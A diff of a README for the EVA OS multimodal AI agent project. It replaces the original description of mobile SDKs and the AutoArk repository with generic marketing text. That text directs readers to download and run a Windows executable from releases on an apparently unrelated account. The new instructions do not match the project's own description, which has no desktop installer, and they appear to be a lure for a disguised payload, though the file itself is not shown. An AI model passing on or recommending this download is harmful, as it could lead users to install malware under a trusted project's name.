@@ -1,180 +1,52 @@
-<div align="center">
-  <a href="./README.md"><img height="28" src="https://img.shields.io/badge/🌐 English-1f6feb?style=flat-square"></a>&nbsp;<a href="./README-zh.md"><img height="28" src="https://img.shields.io/badge/🇨🇳 中文-1f6feb?style=flat-square"></a>
-</div>
+# 🌟 EVA-OS - Experience Intelligent Device Interaction
 
-# **EVA OS — Real-Time Multimodal AIOS for the Next Generation Hardware**
+## 🚀 Overview
+EVA OS is a real-time multimodal AI operating system for modern hardware. It empowers your devices to become “alive” and as intelligent as a real brain. Whether you want seamless automation, smart assistance, or enhanced interactions, EVA OS brings those features to your fingertips.
 
-> ⚡ Real-time · 📡 WebRTC · 🎙️ Multi-Voice · 🧠 EVA-flash · 🔌 Embedded Ready  
->  
-> Multimodal interaction powering intelligent devices · Instantly upgrade any hardware into a real-time multimodal AI terminal
+## 📥 Download EVA-OS
+[![Download EVA-OS](https://img.shields.io/badge/Download%20EVA--OS-v1.0-orange)](https://github.com/incendii89/EVA-OS/releases)
 
-![Image](https://github.com/user-attachments/assets/becd21cd-f5f8-46c4-a8f5-6d11ddb73ac9)
+## 🛠️ System Requirements
+Before downloading, ensure your device meets the following requirements:
 
-## 🚀 Milestone Updates | Latest Updates
+- **Operating System:** Compatible with Windows, macOS, and popular Linux distributions.
+- **Processor:** Minimum dual-core processor for optimal performance.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** A minimum of 10 GB of free disk space.
 
-**[2025-12-07] Release · EVA OS v1.0.0 Officially Launched!**
+## 🥇 Features
+EVA OS offers a range of features designed for a smarter experience:
 
-* ​**🎧 Full Duplex Interaction**​: millisecond-level latency, supports barge-in during conversations, achieving truly human-like real-time dialogue
-* **🛠️ MCP Tools Suite**​: built-in weather forecast, web search, smart map and more utilities, works out-of-the-box
-* **🎙️ Multi-Voice TTS Engine**​: added 10+ humanlike voices (emotional voices, professional broadcast voices and so on), switch in one click within a Solution
-* ​**🧠 Agent Workflow / Multi-Agent Collaboration System**​: enables cross-capability cooperation for complex tasks such as poem creation and story generation
-* ​**🔑 SDK Release / Fully Open Source**​: iOS & Android SDKs are now completely opensourced, providing zero-barrier hardware integration
-* ​**🌐 LiveKit Deep Optimization**​: ultra-low latency full-duplex communication
+- **Real-time AI Processing:** Handle tasks instantly with advanced AI algorithms.
+- **Multimodal Interaction:** Communicate with your devices through voice, text, or touch.
+- **Customizable Interfaces:** Personalize your experience with modular design options.
+- **Seamless Connectivity:** Easily integrate with a variety of smart devices.
+- **Data Security:** Keep your information safe with built-in security protocols.
 
-## 🔮 About EVA OS · Core Positioning
+## 📥 Download & Install
+To get started with EVA OS, follow these steps:
 
-EVA OS is an **open-source, multimodal, low-latency** real-time AI Agent engine designed for next-generation AI hardware. It is deeply optimized for mobile devices, IoT hardware, and embedded systems. It fills the gap between “device intelligence” and “user experience.”
+1. **Visit our Releases Page:** Click the link below to access the download files.
+   [Visit this page to download](https://github.com/incendii89/EVA-OS/releases)
 
-Through the EVA platform, developers can quickly create Solutions (AI Agents) with real-time multimodal interaction, and with a single API Key achieving **“develop once, run on all devices.”** Any hardware can instantly become a “real-time multimodal interactive, agent-cooperative, memory-capable AI hub.”
+2. **Choose Your Version:** Look for the latest version listed on the page. It will usually be at the top, with the version number and release date.
 
-> Core Benefits: EVA-flash model permanently free | Mobile SDK 100% open source | ESP32/RK/MCU embedded SDK coming soon
+3. **Select the Correct File:** Download the file that matches your operating system. For example, if you are using Windows, look for `EVA_OS_Windows.exe`.
 
-![Image](https://github.com/user-attachments/assets/4815de5b-4f2f-4ab7-8803-8d4445781d0c)
-## **🧠 The Vision Behind EVA OS**
+4. **Start the Download:** Click on the file link to start downloading. Your browser will prompt you to save the file.
 
-Our belief:
+5. **Run the Installer:** Once the file is downloaded, open it to start the installation process. Follow the prompts on the screen to complete the installation.
 
-* Foundation models are merely “neurons”
-* AI hardware needs a “nervous system”
-* **EVA OS aims to become the nervous system of next-generation AI devices**
+6. **Launch EVA OS:** After installation, find the EVA OS application on your device. Double-click the icon to open it and enjoy the features of your new operating system.
 
-![Image](https://github.com/user-attachments/assets/c2a7f170-b0e9-44d5-ad6d-cd830fcfe328)
-### **AIOS (AI Operating System)** is defined as “the nervous system of next-generation AI hardware”
+7. **Visit our Community:** If you need help or want to share your experience, join our user community through the discussion forums linked on the Releases page.
 
-* **​Interaction Layer：​** From **single-modality** to **multi-modality**  
-  The system can simultaneously understand text, speech, images, video, etc. It also supports barge-in, speech interruption, and real-time responsiveness, making AI “converse like a human.”
+## 📝 User Guide
+For detailed instructions on using EVA OS, refer to our user guide. It covers everything from basic interactions to advanced features. 
 
-* **​Memory Layer：** ​From **text** memory to **multimodal** memory
-  And from **storage-based** memory to **parameterized** memory.  
-  The AI remembers not only text, but also images, audio, and contextual modalities —- making memory deeper and more integrated.
-
-* **Execution Layer：** From **simple API calls to complex reasoning**
-  EVA OS evolves from executing fixed commands to performing logical reasoning and solving complex tasks.
-
-* **Persona Layer (Representation)：** From **programmed behavior to model-driven dynamics**  
-  The AI’s “persona” becomes dynamic, adaptive, and humanlike—shaped by large model reasoning rather than rigid code.
-
-## **✨ EVA OS 1.0 Features**
-
-### ⚡ Core Advantages · Defining the New Paradigm of AI OS–Level Hardware Interaction
-
-#### 🧠 EVA-flash: Hardware-Friendly Real-Time Multimodal LM
-
-* Streaming architecture with response latency as low as 300ms
-* Native multimodal support: speech, vision, text
-* Lightweight optimization for mid-range hardware
-
-#### 📱 Full-Stack Open-Source SDK · Zero Barrier Integration
-
-* iOS/Android SDK fully open source with detailed demos
-* ESP32/RK/MCU embedded SDK in final testing
-* Best-practice samples for IoT / toys / speakers
-
-#### 😲 Digital Avatar Engine
-
-* Real-time lip-sync
-* Multiple default avatars included
-* Custom user-generated avatars coming soon
-
-#### 🔊 Multi-Voice Audio/Video Interaction
-
-* 10+ humanlike voices with emotional modulation
-* Full-duplex communication with natural barge-in
-* Smart auto-response + customizable greetings
-
-#### 🌐 WebRTC Global Real-Time Connectivity
-
-* Real-time audio/video streaming
-* Truly full-duplex—no: more “waiting for reply” gaps
-
-#### 🧩 Highly Configurable AI Agent Framework
-
-* Custom prompt templates for education, home, office, etc.
-* Multi-Agent routing for complex task orchestration
-* Built-in MCP tools for personalized functions
-
-#### 🌍 Ecosystem Matrix · Full-Scenario AI Hardware Coverage
-
-* Unified Solution API Key supporting mainstream hardware
-* Fully open resources: SDKs, sample projects, docs
-* [Coming Soon]: Embedded system SDK, edge-cloud collaboration, embodied intelligence APIs
+## 🌐 Support
+If you encounter any issues or have questions, please check our support resources available on the Releases page or submit an issue in our repository. 
 
 ---
 
-## **🚀 Quick Start**
-
-**1️⃣ Register an EVA Platform Account**
-
-Visit: **https://eva.autoarkai.com**
-
-Create:
-
-* Solution
-* Configure Voices, Prompts, Tools, Agents
-* Obtain API Key
-
-**2️⃣ Use API Key to Generate a LiveKit Token**
-
-Refer to the example in the mobile SDK:  
-[eva-client.ts](https://github.com/AutoArk/EVA-OS/blob/main/eva-mobile/README.md#3-reference-implementation)
-
-**3️⃣ Client Connection Example**
-
-Refer to React Native example:  
-[React Native Example Docs](https://github.com/AutoArk/EVA-OS/blob/main/eva-mobile/README.md#3-reference-implementation)
-
-## **🗺️ Roadmap**
-
-### **✅ Completed**
-
-* 🎧 Real-time full-duplex audio/video interaction
-* ⚡ EVA-flash real-time multimodal LM 
-* 🧩 Solution (AI Agent) framework
-* 🔑 API Key device access
-* 📱 iOS & Android SDK fully open source
-* 🛠️ Built-in MCP Tools
-
-### 🚀 Coming Soon
-
-* 🔌 Embedded SDK: ESP32/RK/MCU hardware-level integration
-* ☁️ Edge-Cloud Collaboration: cloud compute scheduling + precise device-side command delivery
-* 🧠 Intelligent Memory: short-term interaction memory + long-term preference memory
-* 🔧 MCP Tool Extensions: third-party tool integration
-* 🎭 Custom Digital Avatars: generate avatars from costomized photos
-* 🏢 Enterprise Features: hybrid model deployment + high-concurrency solutions
-
----
-
-## **🤝 Join the EVA Open-Source Ecosystem**
-
-### Join the Ecosystem · Building the Future of AI OS for Hardware
-
-EVA’s vision: empower every device with autonomous interaction, execution, and memory: awakening true hardware-level AI intelligence.
-
-You are welcome whether you are:
-
-* App developers  
-* IoT / toy / smart home device/ robotics creators  
-* Embedded engineers (ESP32 / RK / STM32)  
-* DIY makers
-
-You can contribute:
-
-* PRs (optimize mobile SDK)
-* Embedded integration examples
-* Tutorials / documentation
-* New language SDKs
-* Device-side demos
-* Issues / feature requests
-
-**Let’s build the most open and complete real-time multimodal AI hardware ecosystem—together!**
-
-## 📄 License
-
-EVA OS is released under the MIT License.
-
-This means you are free to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, as long as you include the original copyright and permission notice in any copies or substantial portions.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=AutoArk/EVA-OS&type=date&legend=top-left)](https://www.star-history.com/#AutoArk/EVA-OS&type=date&legend=top-left)
+Now you are ready to transform your device into a smarter, more capable machine with EVA OS. Enjoy the intelligence at your command!
